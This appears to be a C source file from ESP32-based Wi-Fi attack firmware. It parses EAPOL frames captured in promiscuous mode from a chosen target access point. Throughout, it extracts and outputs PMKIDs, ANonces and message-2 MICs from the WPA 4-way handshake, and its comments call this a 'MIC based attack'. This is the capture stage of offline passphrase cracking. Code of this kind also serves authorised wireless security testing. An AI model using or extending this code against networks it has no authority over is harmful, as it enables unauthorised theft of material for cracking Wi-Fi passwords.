/**
 * @file frame_parser.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implements functionality for parsing frames of type data
 */

#include "frame_parser.h"

#include <stdio.h>

#include "arpa/inet.h"
#include "eapol_frame.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"
#include "frame_constants.h"
#include "frame_eapol_validator.h"
#include "frame_output.h"

ESP_EVENT_DEFINE_BASE(FRAME_RECEIVED_EVENT_BASE);
ESP_EVENT_DEFINE_BASE(ATTACK_STATUS_EVENT_BASE);
static uint8_t u_target_bssid[6];
static uint8_t parse_type = NULL_PARSE_TYPE;

// * For MIC based attack, current eapol message number, curr_eapol_m_num = 1
// * if the first message of 4 way handshake is received
static uint8_t curr_eapol_m_num = 0;
// * For MIC based attack, current eapol station mac address, the station that
// * receives the anonce from the first message of 4 way hanshake
static uint8_t curr_eapol_sta_mac[6];
// * For MIC based attack, received_eapol_message_2 = 1 if the second message of
// * 4 way handshake is received
static uint8_t received_eapol_message_2 = 0;

/**
 * @brief Parses and outputs PMKID
 * @param *wpa_data WPA data in the eapol frame
 * @param *eapol_frame EAPOL frame which contains wpa data
 * @param *key_info Information (2 bytes) about the EAPOL authentication to determine if it is a message 1 or 2 from 4 way handshake
 */
void parse_pmkid(eapol_auth_data_t *wpa_data, eapol_frame_t *eapol_frame,
                 key_information_t *key_info) {
  if (key_info->key_type == 1 && key_info->key_ack == 1 &&
      key_info->install == 0) {
    wpa_key_data_t *key_data = (wpa_key_data_t *)wpa_data->wpa_key_data;
    if (eapol_valid_pmkid(key_data) == GOOD_PMKID) {
      output_pmkid(eapol_frame);
    } else {
      return;
    }
  }
}

/**
 * @brief Parses the Anonce (Access point nonce) from message 1 of EAPOL authentication
 * @param *mac_header Contains the transmitter address, receiver address and BSSID
 * @param *msg_1 First EAPOL message from 4-way handshake
 */
void parse_anonce_message_1(mac_header_t *mac_header, eapol_frame_t *msg_1) {
  // * This is the first message of 4 way handshake, the access point transmit
  // * the anonce and the client is the receiver

  if (curr_eapol_m_num == 0) {
    // This is the first time when the first message of 4 way handshake is
    // received, if curr_eapol_m_num is 1 then the first message is received
    // for the second or third time
    output_anonce_from_message_1(msg_1);
    memcpy(curr_eapol_sta_mac, mac_header->receiver_addr, 6);
    curr_eapol_m_num = 1;

  } else if (curr_eapol_m_num == 1) {
    // If the first message of 4 way handshake is received and the receiver
    // address or the client does not match with the first message that we
    // previously captured then we update the curr_eapol_sta_mac with the new
    // client. Otherwise its a retransmission of the first message

    if (memcmp(curr_eapol_sta_mac, mac_header->receiver_addr, 6) != 0) {
      output_anonce_from_message_1(msg_1);
      memcpy(curr_eapol_sta_mac, mac_header->receiver_addr, 6);
    }
  }
}

/**
 * @brief Parses the Snonce (Station nonce) and other relevant information such as MIC from message 2 of EAPOL authentication
 * @param mac_header Contains the transmitter address, receiver address and BSSID
 * @param msg_2 Second EAPOL message from 4-way handshake
 */
void parse_mic_message_2(mac_header_t *mac_header, eapol_frame_t *msg_2) {
  // * This is the second message of 4 way handshake, the client transmit
  // * the snonce, mic and other information. The access point is the receiver

  if (curr_eapol_m_num == 1) {
    if (received_eapol_message_2 == 1) {
      return;
    }

    if (memcmp(curr_eapol_sta_mac, mac_header->transmitter_addr, 6) == 0) {
      received_eapol_message_2 = 1;
      output_mic_from_message_2(msg_2);
    }
  }
}

/**
 * @brief Parses and outputs MIC
 * @param *wpa_data WPA data in the eapol frame
 * @param *eapol_frame EAPOL frame which contains wpa data
 * @param *key_info Information (2 bytes) about the EAPOL authentication to determine if it is a message 1 or 2 from 4 way handshake
 */
void parse_mic(eapol_auth_data_t *wpa_data, eapol_frame_t *eapol_frame,
               key_information_t *key_info) {
  mac_header_t *mac_header = &eapol_frame->mac_header;

  if (key_info->key_type == 1 && key_info->key_ack == 1 &&
      key_info->install == 0) {
    parse_anonce_message_1(mac_header, eapol_frame);
  }

  if (key_info->key_type == 1 && key_info->key_mic == 1 &&
      key_info->secure == 0) {
    parse_mic_message_2(mac_header, eapol_frame);
  }
}

/**
 * @brief Do a bitwise operation on key information to determine the values of the attributes
 * @param *key_info_16 key information and its attributes (2 bytes)
 * @return key information which is of type key_information_t
 */
key_information_t perform_bitwise_on_key_info(uint16_t *key_info_16) {
  key_information_t key_info;

  key_info.reserved = ((*key_info_16) >> 14) & 0x03;
  key_info.smk_message = ((*key_info_16) >> 13) & 0x01;
  key_info.encrypted_key_data = ((*key_info_16) >> 12) & 0x01;
  key_info.request = ((*key_info_16) >> 11) & 0x01;
  key_info.error = ((*key_info_16) >> 10) & 0x01;
  key_info.secure = ((*key_info_16) >> 9) & 0x01;
  key_info.key_mic = ((*key_info_16) >> 8) & 0x01;
  key_info.key_ack = ((*key_info_16) >> 7) & 0x01;
  key_info.install = ((*key_info_16) >> 6) & 0x01;
  key_info.key_index = ((*key_info_16) >> 4) & 0x03;
  key_info.key_type = ((*key_info_16) >> 3) & 0x01;
  key_info.key_descriptor_version = (*key_info_16) & 0x07;

  return key_info;
}

/**
 * @brief Checks if parsing target is PMKID or MIC. Which then calls parse_pmkid() if PMKID or parse_mic() if MIC.
 * @param *wpa_data Buffer of WPA data from EAPOL frame
 * @param *eapol_frame Buffer of EAPOL frame
 */
void parse_80211_authentication(eapol_auth_data_t *wpa_data,
                                eapol_frame_t *eapol_frame) {
  uint16_t key_info_16 = htons(wpa_data->key_info);
  key_information_t key_info = perform_bitwise_on_key_info(&key_info_16);

  if (parse_type == PARSE_PMKID) {
    parse_pmkid(wpa_data, eapol_frame, &key_info);
  } else if (parse_type == PARSE_MIC) {
    parse_mic(wpa_data, eapol_frame, &key_info);
  }
}

/**
 * @brief Callback function for handling frame of type DATA when promiscuous mode or monitor mode is turned on
 */
void data_frame_parser(void *args, esp_event_base_t event_base,
                       int32_t event_id, void *event_data) {
  wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)event_data;
  eapol_frame_t *eapol_frame = (eapol_frame_t *)frame->payload;
  frame_control_t *frame_control = &eapol_frame->frame_control;
  eapol_auth_data_t *wpa_data = (eapol_auth_data_t *)eapol_frame->auth_data;

  // Checks if it is a IEEE 802.11 QoS data
  if (is_qos_data(frame_control) == NOT_QOS) {
    return;
  }
  // Checks if bssid in eapol frame matched with target bssid
  if (bssid_in_eapol_matched(eapol_frame, u_target_bssid) ==
      BSSID_NOT_MATCHED) {
    return;
  }
  // Checks if authentication type is Authentication (0x888e)
  if (is_eapol_auth_type(eapol_frame) == WRONG_EAPOL_AUTH_TYPE) {
    return;
  }
  // Checks if packet type is Key (0x03)
  if (wpa_data->type == EAPOL_KEY_TYPE) {
    parse_80211_authentication(wpa_data, eapol_frame);
  } else {
    printf("frame_parser.data_frame_parser > Wrong packet type: %x\n",
           wpa_data->type);
  }
}

void frame_parser_unregister_data_frame_handler() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_RECEIVED_EVENT_BASE,
                                               DATA_FRAME, &data_frame_parser));
  printf(
      "frame_parser.frame_parser_unregister_data_frame_handler > Unregistered "
      "event handler for data frames\n");
}

void frame_parser_register_data_frame_handler() {
  ESP_ERROR_CHECK(esp_event_handler_register(
      FRAME_RECEIVED_EVENT_BASE, DATA_FRAME, &data_frame_parser, NULL));
  printf(
      "frame_parser.frame_parser_register_data_frame_handler > Registered "
      "event handler for data frames\n");
}

void frame_parser_clear_target_parameter() {
  for (uint8_t i = 0; i < 6; i++) {
    u_target_bssid[i] = '0';
  }
  parse_type = NULL_PARSE_TYPE;
  printf("frame_parser.frame_parser_clear_target_parameter > Target unset\n");
}

void frame_parser_set_target_parameter(uint8_t *target_bssid,
                                       uint8_t selected_parse_type) {
  // Resets the eapol message number
  curr_eapol_m_num = 0;
  // Resets the flag for checking if message 2 is received
  received_eapol_message_2 = 0;

  memcpy(u_target_bssid, target_bssid, 6);
  parse_type = selected_parse_type;
  uint8_t *b = u_target_bssid;
  printf(
      "frame_parser.frame_parser_set_target_parameter > Target set AP: "
      "%02X%02X%02X%02X%02X%02X\n",
      b[0], b[1], b[2], b[3], b[4], b[5]);
  if (selected_parse_type == PARSE_PMKID) {
    printf(
        "frame_parser.frame_parser_set_target_parameter > Frame type to parse: "
        "PMKID\n");
  } else if (selected_parse_type == PARSE_MIC) {
    printf(
        "frame_parser.frame_parser_set_target_parameter > Frame type to parse: "
        "MIC\n");
  }
}